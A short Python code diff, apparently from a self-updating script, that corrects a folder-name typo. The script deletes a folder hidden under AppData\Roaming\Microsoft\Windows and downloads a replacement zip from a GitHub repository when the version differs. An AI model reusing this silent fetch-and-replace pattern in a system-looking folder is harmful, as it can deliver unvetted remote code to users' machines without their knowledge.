@@ -11,7 +11,7 @@ with open(os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows
     if ver == ver1:
         pass
     else:
-        shutil.rmtree(os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'skibid-mainmain'))
+        shutil.rmtree(os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'skibidi-mainmain'))
         target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
         r = requests.get("https://github.com/noel-create/skibidi/archive/refs/heads/mainmain.zip", allow_redirects=True)
         file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skibidi-mainmain.zip')
